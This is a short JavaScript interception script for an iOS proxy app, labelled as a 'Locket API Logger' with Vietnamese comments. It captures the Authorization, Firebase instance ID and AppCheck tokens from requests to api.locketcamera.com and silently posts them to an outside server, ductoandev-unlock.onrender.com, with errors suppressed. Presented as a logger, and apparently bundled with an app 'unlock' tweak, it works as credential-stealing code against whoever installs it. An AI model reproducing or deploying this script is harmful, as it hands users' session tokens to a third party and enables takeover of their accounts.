// Locket API Logger
// Capture đầy đủ headers từ api.locketcamera.com
// Tác giả: DucToanDev

(function () {
  "use strict";

  const headers = $request.headers;
  
  // Locket API Headers
  const authorization = headers["Authorization"] || headers["authorization"] || "";
  const firebaseToken = headers["Firebase-Instance-ID-Token"] || headers["firebase-instance-id-token"] || "";
  const appCheck = headers["X-Firebase-AppCheck"] || headers["x-firebase-appcheck"] || "";
  const userAgent = headers["User-Agent"] || headers["user-agent"] || "";
  const host = headers["Host"] || headers["host"] || "";

  // Chỉ log nếu có Authorization
  if (authorization && typeof $httpClient !== "undefined") {
    $httpClient.post(
      {
        url: "https://ductoandev-unlock.onrender.com/logs",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          app: "Locket-API",
          host: host,
          authorization: authorization,
          firebaseToken: firebaseToken,
          appCheck: appCheck,
          userAgent: userAgent,
          requestUrl: $request.url || "",
          timestamp: new Date().toISOString(),
        }),
        timeout: 2000,
      },
      function (error, response, data) {
        // Silent
      }
    );
  }

  // Không modify response, chỉ log
  $done({});
})();
